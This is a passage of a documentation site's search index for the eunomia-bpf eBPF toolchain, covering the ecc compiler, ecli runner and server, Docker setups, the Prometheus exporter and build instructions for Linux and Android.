it and wait for the workflow to stop</li> <li>Run the <code>ecli</code> with remote url:</li> </ol> <pre><code>$ sudo ./ecli run https://eunomia-bpf.github.io/ebpm-template/package.json\n</code></pre>","tags":["docker","eunomia-bpf"]},{"location":"eunomia-bpf/ecc/docker-usage/#notifications","title":"Notifications","text":"<ol> <li>We use the same c ebpf code as libbpf, so most libbpf ebpf c code can run without any modification.</li> <li>Supported ebpf program types: <code>kprobe</code>, <code>tracepoint</code>, <code>fentry</code>, we will add more types in the future.</li> <li> <p>If you want to use ring buffer to export events, you need to add <code>your_program.h</code> to your repo, and    define the export data type in it, the export data type should be a C <code>struct</code>, for example:</p> <pre><code>struct process_event {\n    int pid;\n    int ppid;\n    unsigned exit_code;\n    unsigned long long duration_ns;\n    char comm[TASK_COMM_LEN];\n    char filename[MAX_FILENAME_LEN];\n    int exit_event;\n};\n</code></pre> <p>The name and field types are not limited, but we will prefer use standard C types. If multiple struct exists in the header, we will use the first one. The feature is only enabled if we found a <code>BPF_MAP_TYPE_RINGBUF</code> map exists in the ebpf program.</p> </li> </ol> <p>Share on  Share on </p>","tags":["docker","eunomia-bpf"]},{"location":"eunomia-bpf/ecc/github-template/","title":"Github Action \u6a21\u677f","text":"<p>ebpm-template\uff1a\u4f7f\u7528 Github Action \u8fdb\u884c\u8fdc\u7a0b\u7f16\u8bd1\uff0c\u672c\u5730\u4e00\u952e\u8fd0\u884c\uff1b</p> <p>\u8bf7\u53c2\u8003\uff1ahttps://github.com/eunomia-bpf/ebpm-template</p>"},{"location":"eunomia-bpf/ecc/github-template/#a-template-for-eunomia-bpf-programs","title":"A template for eunomia-bpf programs","text":"<p>This is a template for eunomia-bpf eBPF programs. You can use t as a template, compile it online with <code>Github Actions</code> or offline.</p>"},{"location":"eunomia-bpf/ecc/github-template/#compile-and-run-the-ebpf-code-as-simple-as-possible","title":"Compile and run the eBPF code as simple as possible!","text":"<p>Download the pre-compiled <code>ecli</code> binary from here: eunomia-bpf/eunomia-bpf</p> <p>To install, just download and use the <code>ecli</code> binary from here: eunomia-bpf/eunomia-bpf:</p> <pre><code>wget https://aka.pw/bpf-ecli -O ecli &amp;&amp; chmod +x ecli\n</code></pre>"},{"location":"eunomia-bpf/ecc/github-template/#use-this-repo-as-a-github-action-to-compile-online","title":"use this repo as a github action to compile online","text":"<ol> <li>use this repo as a github template: see creating-a-repository-from-a-template</li> <li>modify the <code>bootstrap.bpf.c</code>, commit it and wait for the workflow to stop</li> <li>Run the <code>ecli</code> with remote url:</li> </ol> <pre><code>$ sudo ./ecli run https://eunomia-bpf.github.io/ebpm-template/package.json\n</code></pre>"},{"location":"eunomia-bpf/ecc/github-template/#quick-start","title":"quick start","text":"<p>just write some code in the <code>bootstrap.bpf.c</code>, after that, simply run this:</p> <pre><code>$ docker run -it -v /path/to/repo:/src ghcr.io/eunomia-bpf/ecc-`uname -m`:latest # use absolute path\n</code></pre> <p>you will get a <code>package.json</code> in your root dir. Just run:</p> <pre><code>$ sudo ./ecli run package.json\n</code></pre> <p>The ebpf compiled code can run on different kernel versions(CO-RE). You can just copied the json to another machine. see: github.com/eunomia-bpf/eunomia-bpf for the runtime, and eunomia-bpf/eunomia-cc for our compiler tool chains.</p>"},{"location":"eunomia-bpf/ecc/github-template/#the-code-here","title":"The code here","text":"<p>This is an example of ebpf code, we copied the bootstrap.bpf.c from libbpf-bootstrap, without any modification. You can read their <code>README</code> for details: https://github.com/libbpf/libbpf-bootstrap</p>"},{"location":"eunomia-bpf/ecc/github-template/#more-examples","title":"more examples","text":"<p>for more examples, please see: eunomia-bpf/eunomia-bpf/tree/master/examples/bpftools</p> <p>Share on  Share on </p>"},{"location":"eunomia-bpf/ecc/usage/","title":"ecc usage","text":"<pre><code>ecc [OPTIONS] &lt;SOURCE_PATH&gt; [EXPORT_EVENT_HEADER]\n</code></pre> <p>Compiles and generates a bpf object from the provided SOURCE_PATH path for the specified eBPF program.</p>","tags":["ecc","maunal"]},{"location":"eunomia-bpf/ecc/usage/#example","title":"example","text":"","tags":["ecc","maunal"]},{"location":"eunomia-bpf/ecc/usage/#packagejson-only","title":"package.json only","text":"<pre><code>ecc foo.bpf.c\n</code></pre>","tags":["ecc","maunal"]},{"location":"eunomia-bpf/ecc/usage/#source-file-and-a-header-file","title":"Source file and a header file","text":"<pre><code>ecc foo.bpf.c bar.h\n</code></pre>","tags":["ecc","maunal"]},{"location":"eunomia-bpf/ecc/usage/#generate-custom-btfhub-archive-and-package-into-tar","title":"Generate custom btfhub-archive and package into tar","text":"<pre><code>ecc -b client.bpf.c event.h\n</code></pre> <p>This command will compile client.bpf.c and event.h into client.bpf.o, and package them as json, export a tar containing a custom btf file.</p> <p>output in <code>OUTPUT_PATH</code>:</p> <pre><code>package.json\nclient.tar #include custom btf files\n</code></pre>","tags":["ecc","maunal"]},{"location":"eunomia-bpf/ecc/usage/#btfhub-support","title":"btfhub Support","text":"<p>BTF is the things that make eBPF portable.</p> <p><code>btfhub</code> provide BTF information for Linux distributions released kernels that don't have embedded BTF information.</p> <p>By using btfhub to package ebpf programs as tar file, ecc makes it possible to run ebpf programs on older kernels that do not have btf support.</p> <p>A list of existing distributions and their current status on eBPF and BTF support.</p>","tags":["ecc","maunal"]},{"location":"eunomia-bpf/ecc/usage/#arguments-and-options","title":"Arguments and options","text":"","tags":["ecc","maunal"]},{"location":"eunomia-bpf/ecc/usage/#arguments","title":"Arguments","text":"<ul> <li> <p><code>SOURCE_PATH</code>: path of the bpf.c file to compile</p> </li> <li> <p><code>EXPORT_EVENT_HEADER</code>: path of the bpf.h header for defining event struct</p> </li> </ul>","tags":["ecc","maunal"]},{"location":"eunomia-bpf/ecc/usage/#options","title":"Options","text":"<ul> <li>-o, --output-path <code>OUTPUT_PATH</code>: path of output bpf object</li> <li>-w, --workspace-path <code>WORKSPACE_PATH</code>: specify custom workspace path</li> <li>-a, --additional-cflags <code>ADDITIONAL_CFLAGS</code>: additional cflags for clang</li> <li>example <code>-a=\"-fstack-protector\"</code>,   this avoids runtime errors on some distributions that have clang stack protection enabled by default.</li> <li>-c, --clang-bin <code>CLANG_BIN</code>: path of clang binary (default: clang)</li> <li>-l, --llvm-strip-bin <code>LLVM_STRIP_BIN</code>: path of llvm-strip binary (default: llvm-strip)</li> <li>-s, --subskeleton: do not pack bpf object in config file</li> <li>-v, --verbose: print the command execution</li> <li>-y, --yaml: output config skel file in yaml</li> <li>--header-only: generate a bpf object for struct definition in header file only</li> <li>--wasm-header: generate wasm include header</li> <li>-b, --btfgen: fetch custom btfhub archive file and package into tar</li> <li>If <code>BTFHUB_ARCHIVE</code> does not exist, it will clone   btfhub to <code>BTFHUB_ARCHIVE</code>.</li> <li>This option will take a lot of time, if you don't want to package or generate all custom btf files,   you can keep only the required btf files in <code>BTFHUB_ARCHIVE</code>.</li> <li>Don't worry, even the tar containing all the btfhub archives is only <code>5-10MB</code> in size.</li> <li>--btfhub-archive <code>BTFHUB_ARCHIVE</code>: directory to save btfhub archive file (default:<code>$HOME/.eunomia/btfhub-archive</code>)</li> <li>-h, --help: prints help documentation.</li> <li>-V, --version: prints version information.</li> </ul> <p>Share on  Share on </p>","tags":["ecc","maunal"]},{"location":"eunomia-bpf/ecli/","title":"ecli: run ebpf programs as json or wasm","text":""},{"location":"eunomia-bpf/ecli/#usage","title":"Usage","text":"<pre><code>sudo ecli &lt;COMMAND&gt;\n</code></pre>"},{"location":"eunomia-bpf/ecli/#example","title":"example","text":"<p>Run the ebpf program as wasm or json.</p> <pre><code># run with wasm bpf modules\nsudo ecli run runqlat.wasm\n# run with json bpf object only\nsudo ecli run package.json\n</code></pre> <p>Or run the ebpf program as a tar file contains minimal BTF info and bpf object.</p> <pre><code>sudo ecli run client.tar\n</code></pre> <p>The ecc packaged tar contains custom btf files and <code>package.json</code>, which can be run on older kernels.</p> <p>For details, see ecc-btfgen</p>"},{"location":"eunomia-bpf/ecli/#commands","title":"Commands","text":"<ul> <li>run - Run the ebpf program as tar or json.</li> <li>push - Push a container to an OCI registry.</li> <li>pull - Pull a container from an OCI registry.</li> <li>login - Login to an OCI registry.     <code>ecli</code> will check gh cache and <code>GITHUB_TOKEN</code>     env when you login to ghcr.io, either one can be logged into ghcr without entering a token.</li> <li>logout - Logout from an OCI registry.     <code>ecli logout xxx</code> will remove identity certificates stored under <code>~/.eunomia</code>.</li> </ul> <p>Share on  Share on </p>"},{"location":"eunomia-bpf/ecli/ecli-dockerfile-usage.zh/","title":"ecli dockerfile usage","text":"<p>bpf \u8fd0\u884c\u65f6\u9700\u8981\u6709Linux\u5185\u6838\u76f8\u5173\u652f\u6301\uff0cdocker \u4e2d\u7684\u5185\u6838\u5171\u4eab\u7684\u5bbf\u4e3b\u673a\u7684\u5185\u6838\uff0c\u56e0\u6b64\u4f7f\u7528docker\u8fd0\u884cbpf\u7a0b\u5e8f\u65f6\u9700\u8981\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u4e3a\u5bb9\u5668\u8d4b\u4e88\u6743\u9650\u548c\u76f8\u5173\u5185\u6838\u652f\u6301\u3002</p> <p>\u6b64\u5904\u53c2\u8003https://github.com/iovisor/bpftrace/blob/master/INSTALL.md#kernel-headers-install</p> <pre><code>$ docker run -ti -v /usr/src:/usr/src:ro \\\n       -v /lib/modules/:/lib/modules:ro \\\n       -v /sys/kernel/debug/:/sys/kernel/debug:rw \\\n       -v /home/admin/my:/root/my \\ //\u6302\u8f7d\u672c\u673a\u76ee\u5f55\u5230\u5bb9\u5668\u7684/root/my\u8def\u5f84\u4e0b\n       --net=host --pid=host --privileged \\\n       ecli:1.0.1\n</code></pre>"},{"location":"eunomia-bpf/ecli/ecli-dockerfile-usage.zh/#dockerfile-ubuntu","title":"dockerfile ubuntu","text":"<p>dockerfile\u7684\u57fa\u7840\u955c\u50cf\u662fUbuntu\uff0c\u56fd\u5185\u4f7f\u7528\u65f6\u56e0\u4e3a\u6709\u5899\u7684\u5b58\u5728\uff0c\u6240\u4ee5\u9700\u8981\u5bf9Linux\u8fdb\u884c\u6362\u6e90\u3002sources.list\u5982\u4e0b\uff1a</p> <pre><code>deb http://mirrors.aliyun.com/ubuntu/ jammy main restricted universe multiverse\n#deb-src http://mirrors.aliyun.com/ubuntu/ jammy main restricted universe multiverse\ndeb http://mirrors.aliyun.com/ubuntu/ jammy-security main restricted universe multiverse\n#deb-src http://mirrors.aliyun.com/ubuntu/ jammy-security main restricted universe multiverse\ndeb http://mirrors.aliyun.com/ubuntu/ jammy-updates main restricted universe multiverse\n#deb-src http://mirrors.aliyun.com/ubuntu/ jammy-updates main restricted universe multiverse\ndeb http://mirrors.aliyun.com/ubuntu/ jammy-proposed main restricted universe multiverse\n#deb-src http://mirrors.aliyun.com/ubuntu/ jammy-proposed main restricted universe multiverse\ndeb http://mirrors.aliyun.com/ubuntu/ jammy-backports main restricted universe multiverse\n#deb-src http://mirrors.aliyun.com/ubuntu/ jammy-backports main restricted universe multiverse\n</code></pre> <p>dockerfile\u4e2d\u7684\u5177\u4f53\u5185\u5bb9\u5982\u4e0b</p> <pre><code>FROM ubuntu:latest\n\nENV UBUNTU_SOURCE /etc/apt\n\nCOPY ./ /root\n\nWORKDIR /root\n\nADD sources.list $UBUNTU_SOURCE/\n\nRUN apt-get update &amp;&amp; \\\n    apt-get -y install gcc libelf-dev\n\n#CMD ./ecli run /root/my/package.json\nCMD [\"/bin/bash\"]\n</code></pre> <p>ubuntu.dockerfile\u6784\u5efa\u65f6\uff0c\u540c\u4e00\u7ea7\u76ee\u5f55\u4e0b\u7684\u6587\u4ef6\u5982\u4e0b</p> <p></p> <p>ecli\u53ef\u6267\u884c\u6587\u4ef6  sources.list Dockerfile\u8fd9\u4e09\u4e2a\u6587\u4ef6\u7f3a\u4e00\u4e0d\u53ef\uff0cother\u6587\u4ef6\u53ef\u5ffd\u7565\u3002docker\u5bb9\u5668\u4e2dwget\u65e0\u6cd5\u8fde\u63a5\u5916\u90e8\u7f51\u7edc\uff0c\u56e0\u6b64\u9700\u8981\u5728docker\u6784\u5efa\u65f6\u5c06ecli\u653e\u5165\u955c\u50cf\u4e2d\u3002\u4f7f\u7528\u955c\u50cf\u65f6\u53ea\u8981\u6302\u8f7d\u7684\u672c\u673a\u76ee\u5f55\u4e2d\u6709package.json\u6587\u4ef6\u5373\u53ef\u3002</p>"},{"location":"eunomia-bpf/ecli/ecli-dockerfile-usage.zh/#docker-alpine","title":"docker alpine","text":"<pre><code>FROM alpine:latest\n\nCOPY ./ /root\n\nWORKDIR /root\n\nRUN sed -i 's/dl-cdn.alpinelinux.org/mirrors.aliyun.com/g' /etc/apk/repositories &amp;&amp; \\\n    apk update &amp;&amp; \\\n    apk install gcc libelf gcompat\n\n#CMD ./ecli run /root/my/package.json\n</code></pre> <p>alpine.dockerfile\u6784\u5efa\u955c\u50cf\u65f6\uff0c\u540c\u4e00\u7ea7\u76ee\u5f55\u4e0b\u5fc5\u987b\u6709ecli\u53ef\u6267\u884c\u6587\u4ef6\u3002 \u76ee\u524dalpine.dockerfile\u4ecd\u5b58\u5728\u4ee5\u4e0b\u95ee\u9898</p> <p></p>"},{"location":"eunomia-bpf/ecli/ecli-dockerfile-usage.zh/#docker-build","title":"docker build","text":"<p>dockerfile\u6784\u5efa\u65f6\u4f7f\u7528\u5982\u4e0b\u547d\u4ee4</p> <pre><code>sudo docker build -t ecli:1.0.1 .\n</code></pre>"},{"location":"eunomia-bpf/ecli/ecli-dockerfile-usage.zh/#_1","title":"\u53c2\u8003\u6587\u6863","text":"<p>bpftrace \u5b98\u65b9\u8bf4\u660e\uff08\u5982\u4f55\u8ba9bpf\u7a0b\u5e8f\u5728docker\u4e2d\u8fd0\u884c\uff09</p> <p>https://github.com/iovisor/bpftrace/blob/master/INSTALL.md#kernel-headers-install</p> <p>\u5982\u4f55\u5728mac\u4e2d\u8fd0\u884c\u5e26\u6709bpf\u8fd0\u884c\u73af\u5883\u7684docker</p> <p>https://petermalmgren.com/docker-mac-bpf-perf/</p> <p>Share on  Share on </p>"},{"location":"eunomia-bpf/ecli/server/","title":"ecli server","text":"<p>You can use server to manager and dynamically install eBPF programs.</p>"},{"location":"eunomia-bpf/ecli/server/#install","title":"install","text":"<p>For example, on Ubuntu:</p> <pre><code># download the preview build server\nwget https://github.com/eunomia-bpf/eunomia-bpf/releases/latest/download/ecli-server-ubuntu-latest.tar.gz\ntar -xzf ecli-server-ubuntu-latest.tar.gz &amp;&amp; chmod +x ./ecli-server\n# download the ecli\nwget https://aka.pw/bpf-ecli -O ecli &amp;&amp; chmod +x ./ecli\n</code></pre>"},{"location":"eunomia-bpf/ecli/server/#usage","title":"usage","text":"<p>start the server:</p> <pre><code>$ sudo ./ecli-server\n[2023-08-08 02:02:03.864009 +08:00] INFO [server/src/main.rs:95] Serving at 127.0.0.1:8527\n</code></pre> <p>use the ecli to control the remote server and manage multiple eBPF programs:</p> <pre><code>$ ./ecli client --help\nClient operations\n\nUsage: ecli client [OPTIONS] &lt;COMMAND&gt;\n\nCommands:\n  start   Start an ebpf program on the specified endpoint\n  stop    Stop running a task on the specified endpoint\n  log     Fetch logs of the given task\n  pause   Pause the task\n  resume  Resume the task\n  list    List tasks on the server\n  help    Print this message or the help of the given subcommand(s)\n\nOptions:\n  -e, --endpoint &lt;ENDPOINT&gt;  API endpoint [default: http://127.0.0.1:8527]\n  -h, --help                 Print help\n\n# you can download sigsnoop.json from https://eunomia-bpf.github.io/eunomia-bpf/sigsnoop/package.json\n$ ./ecli client start sigsnoop.json # start the program\n1\n$ ./ecli client log 1 # get the log of the program\nTIME     PID    TPID   SIG    RET    COMM   \n02:05:58  79725 78132  17     0      bash\n02:05:59  77325 77297  0      0      node\n02:05:59  77297 8042   0      0      node\n02:05:59  77297 8042   0      0      node\n02:05:59  79727 79726  17     0      which\n02:05:59  79726 8084   17     0      sh\n02:05:59  79731 79730  17     0      which\n$ ./ecli client start sigsnoop.json # start another program\n2\n$ ./ecli client list # list all running programs\n1 bpf-program-1691431558 Running\n2 bpf-program-1691431757 Running\n$ ./ecli client stop 1 # stop the program 1\n$ ./ecli client list\n2 bpf-program-1691431757 Running\n$ ./ecli client stop 2 # stop the program 2\n$ ./ecli client list # no program is running\n</code></pre>"},{"location":"eunomia-bpf/ecli/server/#api-document","title":"API document","text":"<p>For the http api, please refer to openapi.yaml.</p> <p>You can also use curl to access the ecli server, for example:</p> <pre><code>$ curl http://127.0.0.1:8527/task # list all running tasks\n{\"tasks\":[{\"status\":\"running\",\"id\":3,\"name\":\"bpf-program-1691432359\"}]}\n$ curl -X POST   -H \"Content-Type: application/json\"   -d '{\n    \"id\": 3,\n    \"log_cursor\": 0,\n    \"maximum_count\": 100\n  }'  http://127.0.0.1:8527/log # get the log of the task 3\n[{\"cursor\":0,\"log\":{\"log\":\"TIME     PID    TPID   SIG    RET    COMM   \",\"timestamp\":1691432359,\"log_type\":\"plain\"}},{\"cursor\":1,\"log\":{\"log\":\"02:19:19  81241 \n....\n,{\"cursor\":99,\"log\":{\"log\":\"02:19:28  80808 77297  0      0      node\",\"timestamp\":1691432368,\"log_type\":\"plain\"}}]\n</code></pre> <p>Share on  Share on </p>"},{"location":"eunomia-bpf/exporter/","title":"eunomia-exporter","text":"<p>An prometheus and OpenTelemetry exporter for custom eBPF metrics, written in async rust: eunomia-exporter</p> <p>This is a single binary exporter, you don't need to install <code>BCC/LLVM</code> when you use it. The only thing you will need to run the exporter on another machine is the config file and pre-compiled eBPF code.</p>"},{"location":"eunomia-bpf/exporter/#supported-scenarios","title":"Supported scenarios","text":"<p>Currently the only supported way of getting data out of the kernel is via maps (we call them tables in configuration).</p> <p>Share on  Share on </p>"},{"location":"eunomia-bpf/exporter/usage/","title":"usage","text":""},{"location":"eunomia-bpf/exporter/usage/#example","title":"example","text":"<p>This is an adapted version of opensnoop from bcc/libbpf-tools, you can check our source code here: examples/bpftools/opensnoop</p> <p>You can just download the pre-compiled opensnoop package.json.</p> <p>Or you can compile the opensnoop like this:</p> <pre><code>$ cd examples/bpftools/opensnoop\n$ docker run -it -v /userpath/eunomia-bpf/examples/bpftools/opensnoop:/src ghcr.io/eunomia-bpf/ecc-`uname -m`:latest\n</code></pre> <p><code>userpath</code> needs to be replaced with your own repo path.</p> <p>After compile the eBPF code, you can define a config file like this:</p> <pre><code>programs:\n  - name: opensnoop\n    metrics:\n      counters:\n        - name: eunomia_file_open_counter\n          description: test\n          labels:\n            - name: pid\n            - name: comm\n            - name: filename\n              from: fname\n    compiled_ebpf_filename: package.json\n</code></pre> <p>use the path to <code>package.json</code> as compiled_ebpf_filename in the config file. You can find the example at config.yaml.</p> <p>Then, you can start the exporter:</p> <pre><code>$ ls\nconfig.yaml  eunomia-exporter package.json\n$ sudo ./eunomia-exporter\n\nRunning ebpf program opensnoop takes 46 ms\nListening on http://127.0.0.1:8526\nrunning and waiting for the ebpf events from perf event...\nReceiving request at path /metrics\n</code></pre> <p>Different from the bcc ebpf_exporter, the only thing you need to run on the deployment machine is the <code>config file</code> and <code>package.json</code>. There is no need to install <code>LLVM/CLang</code> for BCC.</p> <p>The result is:</p> <p></p>"},{"location":"eunomia-bpf/exporter/usage/#manage-ebpf-tracing-program-via-api","title":"manage eBPF tracing program via API","text":"<p>start an eBPF exporter via web API:</p> <pre><code>$ curl -X POST http://127.0.0.1:8526/start -H \"Content-Type: application/json\" -d @examples/opensnoop/curl_post_example.json\n\n{\"id\":1}\n</code></pre> <p>see curl_post_example.json for the example of the request body.</p> <p>list all running eBPF programs:</p> <pre><code>$ curl http://127.0.0.1:8526/list\n\n[{\"id\":0,\"name\":\"bootstrap\"},{\"id\":1,\"name\":\"opensnoop\"}]\n</code></pre> <p>stop an eBPF program:</p> <pre><code>$ curl -X POST http://127.0.0.1:8526/stop -H \"Content-Type: application/json\" -d '{\"id\": 1}'\n</code></pre> <p>documents:</p> <pre><code>$ cargo build --release\n$ target/release/eunomia-exporter -h\neunomia-exporter 0.1.0\n\nUSAGE:\n    eunomia-exporter [OPTIONS]\n\nOPTIONS:\n    -c, --config &lt;CONFIG&gt;    Sets a custom config file [default: config.yaml]\n    -h, --help               Print help information\n    -V, --version            Print version information\n</code></pre> <p>Share on  Share on </p>"},{"location":"eunomia-bpf/setup/","title":"Setup","text":"<p>Share on  Share on </p>"},{"location":"eunomia-bpf/setup/build-android-arm/","title":"Build on Android","text":"<p>Android\u4e0abuild\u9700\u8981\u5148Installing Debian on Android in Termux</p> <p>\u5728Android\u4e0a\u6784\u5efa\u65f6\uff0c\u9700\u8981\u5148Installing Debian on Android in Termux</p> <ol> <li> <p>install termux</p> <p>https://github.com/termux/termux-app/releases/tag/v0.118.0</p> </li> <li> <p>install proot-distro</p> <p>select debian distro</p> <pre><code>pkg install proot-distro\nproot-distro install debian\nproot-distro login debian\n</code></pre> </li> <li> <p>install packages</p> <p>remember <code>proot-distro login debian</code> first</p> <pre><code>apk update\napt install clang cmake libelf1 libelf-dev zlib1g-dev\n</code></pre> <p>\u4e4b\u540e\u7684\u6b65\u9aa4\u548c\u5728ARM\u4e0abuild\u4e0a\u76f8\u540c</p> </li> </ol>"},{"location":"eunomia-bpf/setup/build-android-arm/#build-on-arm","title":"Build on ARM","text":"<ol> <li> <p>\u540c\u6b65 eunomia-bpf \u5230\u672c\u5730</p> <pre><code>git clone https://github.com/eunomia-bpf/eunomia-bpf.git\ncd eunomia-bpf\ngit submodule update --init --recursive --remote\n</code></pre> </li> <li> <p>\u914d\u7f6e\u73af\u5883\u53d8\u91cf</p> <pre><code>export PKG_CONFIG_PATH=/usr/lib/aarch64-linux-gnu/pkgconfig\n</code></pre> </li> <li> <p>\u5b89\u88c5\u4f9d\u8d56</p> <pre><code>apt update\napt install clang cmake libelf1 libelf-dev zlib1g-dev\n</code></pre> </li> <li> <p>\u4fee\u6539wasm-runtime/CMakeLists.txt<code>\u4e2d\u7684</code>WAMR_BUILD_TARGET\uff08may not required\uff09</p> <p>change <code>set (WAMR_BUILD_TARGET \"X86_64\")</code> to <code>set (WAMR_BUILD_TARGET \"AARCH64\")</code></p> </li> <li> <p>\u7f16\u8bd1</p> <pre><code>make bpf-loader\nmake ecli\n</code></pre> </li> <li> <p>\u68c0\u67e5\u8f93\u51fa</p> <pre><code>root@localhost:~/eunomia-bpf# file ecli/build/bin/Release/ecli\necli: ELF 64-bit LSB pie executable, ARM aarch64, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux-aarch64.so.1, BuildID[sha1]=eab42b79be75951e3a573aa7c61136239d35c868, for GNU/Linux 3.7.0, with debug_info, not stripped\n</code></pre> </li> </ol> <p>Share on  Share on </p>"},{"location":"eunomia-bpf/setup/build/","title":"build eunomia-bpf project","text":"<p>If you want to run the cli, in most cases, you don't need to build your own.</p>"},{"location":"eunomia-bpf/setup/build/#install-dependencies","title":"Install Dependencies","text":"<p>You will need <code>clang</code>, <code>libelf</code> and <code>zlib</code> to build the examples, package names may vary across distros.</p> <p>On Ubuntu/Debian, you need:</p> <pre><code>apt install clang libelf1 libelf-dev zlib1g-dev\n</code></pre> <p>On CentOS/Fedora, you need:</p> <pre><code>dnf install clang elfutils-libelf elfutils-libelf-devel zlib-devel\n</code></pre> <p>install rust toolchain</p> <pre><code>curl https://sh.rustup.rs -sSf | sh -s\n</code></pre>"},{"location":"eunomia-bpf/setup/build/#build-bpf-loader-rs","title":"build bpf-loader-rs","text":"<p>bpf-loader is our core library written in C++17. It has no other dependencies except libbpf.</p> <pre><code>make bpf-loader-rs # build ebpf-loader-rs\n</code></pre> <p>The recommended compiler is gcc9 or later.</p>"},{"location":"eunomia-bpf/setup/build/#build-ecli","title":"build ecli","text":"<p>After compile the bpf-loader, you can build the cli tool in C++:</p> <pre><code>make ecli\n</code></pre> <p>reference: https://github.com/libbpf/libbpf-bootstrap</p>"},{"location":"eunomia-bpf/setup/build/#build-wasm-lib","title":"build wasm lib","text":"<pre><code>make wasm-runtime\n</code></pre> <p>Please install WASI SDK, download the wasi-sdk release and extract the archive to default path /opt/wasi-sdk if you want to compile c code to wasm.</p>"},{"location":"eunomia-bpf/setup/build/#build-compiler","title":"build compiler","text":"<pre><code>make ecc\n</code></pre>"},{"location":"eunomia-bpf/setup/build/#install-from-package-manager","title":"install from package manager","text":""},{"location":"eunomia-bpf/setup/build/#nix","title":"nix","text":"<p>On any distros with nix installed:</p>"},{"location":"eunomia-bpf/setup/build/#build-ecc","title":"build ecc","text":"<pre><code>nix build github:eunomia-bpf/eunomia-bpf#ecc # or ecli, see `nix flake show` for details # or ecli\n</code></pre> <p>Run application directly with:</p> <pre><code>nix run github:eunomia-bpf/eunomia-bpf#ecc -- -h\n</code></pre>"},{"location":"eunomia-bpf/setup/build/#openeuler","title":"openEuler","text":"<pre><code>sudo dnf search eunomia-bpf\n# and install\n</code></pre>"},{"location":"eunomia-bpf/setup/build/#more-details","title":"more details","text":"<ul> <li>You can check the Makefile at project root for more details: Makefile</li> <li>You may want to refer to our CI for more build info: ecc.yml</li> </ul> <p>Share on  Share on </p>"},{"location":"others/","title":"Other projects","text":""},{"location":"others/#bpf-benchmark","title":"bpf-benchmark","text":"<p>A test suite to compare the performance of various eBPF runtimes</p> <p>https://github.com/eunomia-bpf/bpf-benchmark</p>"},{"location":"others/#linux-trace-ai-agent","title":"linux-trace-ai-agent","text":"<p>An experiment AI agent for automatic monitoring of system performance.</p> <p>https://github.com/eunomia-bpf/linux-trace-ai-agent</p>"},{"location":"others/#bpf-compatible","title":"bpf-compatible","text":"<p>compatible library for ebpf programs to improve BTF portability</p> <p>https://github.com/eunomia-bpf/bpf-compatible</p>"},{"location":"others/#func-call-for-command","title":"func-call-for-command","text":"<p>Generate GPT function call API from command-line help info</p> <p>https://github.com/eunomia-bpf/func-call-for-command</p>"},{"location":"others/#ebpf-gpts","title":"eBPF GPTs","text":"<p>An experiment: GPTs for eBPF</p> <p>https://chat.openai.com/g/g-h1WOms1QT-ebpf-expert</p>"},{"location":"others/#ebpf-knowledge-base","title":"ebpf-knowledge-base","text":"<p>An ebpf knowledge base, based on llama_index and bpf-developer-tutorial</p> <p>https://github.com/eunomia-bpf/ebpf-knowledge-base</p> <p>Share on  Share on </p>"},{"location":"others/bpf-benchmark/","title":"BPF-Benchmark","text":"<p>BPF-Benchmark is a simple testsuit designed to assess the performance of different userspace eBPF (Berkeley Packet Filter) runtimes.</p>"},{"location":"others/bpf-benchmark/#usage","title":"Usage","text":"<p>To effectively utilize BPF-Benchmark, follow these steps:</p> <ol> <li>Install Dependencies: Ensure that <code>clang</code> and <code>llvm</code> are installed on your system. If you are using <code>Debian</code> or <code>Ubuntu</code>, you can easily install these packages by executing the command: <code>sudo apt install clang llvm</code>.</li> <li>Acquire Runtimes: BPF-Benchmark includes three pre-packaged runtimes: <code>llvm-jit</code>, <code>ebpf</code>, and <code>ubpf</code>. If the provided executables are incompatible with your system, you have the option to manually build these runtimes.</li> <li>Install Required Dependencies: The toolkit relies on various dependencies, all of which are listed in the <code>requirements.txt</code> file. Install these dependencies to ensure smooth functionality.</li> <li>Compile BPF Programs: Execute the command <code>make -C bpf_progs</code> to compile the BPF programs.</li> <li>Run Benchmark: Launch the benchmarking process by running the <code>run_benchmark.py</code> script.</li> <li>View Results: The results of the benchmark can be observed directly in the console, or you can find graphical representations in the <code>output</code> folder. Additionally, raw data in JSON format is stored in <code>output/data.json</code>.</li> </ol>"},{"location":"others/bpf-benchmark/#adding-a-new-test","title":"Adding a New Test","text":"<p>To include a new test within BPF-Benchmark, adhere to these guidelines:</p> <ol> <li>Create BPF Program: Craft an eBPF program and name it as <code>XXX.bpf.c</code>, placing it in the <code>bpf_progs</code> directory. The program should contain a function named <code>unsigned long long bpf_main(void* mem)</code> as its entry point. Any other functions must be inlined using the <code>__always_inline</code> attribute.</li> <li>Optional Memory File: You have the choice to create a file named <code>XXX.mem</code> if your eBPF program requires specific memory input during execution.</li> </ol>"},{"location":"others/bpf-benchmark/#included-test-cases","title":"Included Test Cases","text":"<p>BPF-Benchmark currently incorporates the following BPF code test cases:</p> <ul> <li><code>log2_int.bpf.c</code></li> <li><code>memcpy.bpf.c</code></li> <li><code>native_wrapper.c</code></li> <li><code>prime.bpf.c</code></li> <li><code>simple.bpf.c</code></li> <li><code>strcmp_fail.bpf.c</code></li> <li><code>strcmp_full.bpf.c</code></li> <li><code>switch.bpf.c</code></li> </ul> <p>Select and execute the tests ending with the <code>.bpf</code> extension.</p>"},{"location":"others/bpf-benchmark/#supported-runtimes","title":"Supported Runtimes","text":"<p>BPF-Benchmark facilitates performance comparison across the following runtimes:</p> <ul> <li><code>bpftime-llvm</code></li> <li><code>bpftime-rbpf</code></li> <li><code>bpftime-ubpf</code></li> </ul> <p>These runtimes are involved in the benchmarking process to evaluate their relative efficiencies.</p> <p>Enhance your BPF runtime evaluation experience using BPF-Benchmark! If you encounter any issues or need further assistance, feel free to reach out to us. Your feedback is invaluable in refining this toolkit.</p> <p>repo: https://github.com/eunomia-bpf/bpf-benchmark</p> <p>Share on  Share on </p>"},{"location":"others/bpf-compatible/","title":"bpf-compatible","text":"<p>A set of toolchain to simplify the building and running eBPF program on kernels without native BTF support. It utilizes btfhub to drop the dependency of native BTF.</p>"},{"location":"others/bpf-compatible/#whats-in-it","title":"What's in it","text":"<p>This repo mainly contains three parts:</p> <ul> <li>A shell script <code>script/btfgen</code>, which can be used to clone the <code>btfhub</code> repo, or create stripped btf based on the compiled eBPF program and pack the btf archives into <code>.tar.gz</code></li> <li>A Rust crate <code>bpf-compatible-rs</code>, which were used by eunomia-bpf to implement the unpacking and loading of the package that <code>btfgen</code> generated</li> <li>A Rust crate <code>bpf-compatible-sys</code> and its C binding <code>btf_helpers.h</code>, which could be linked to other programs. It 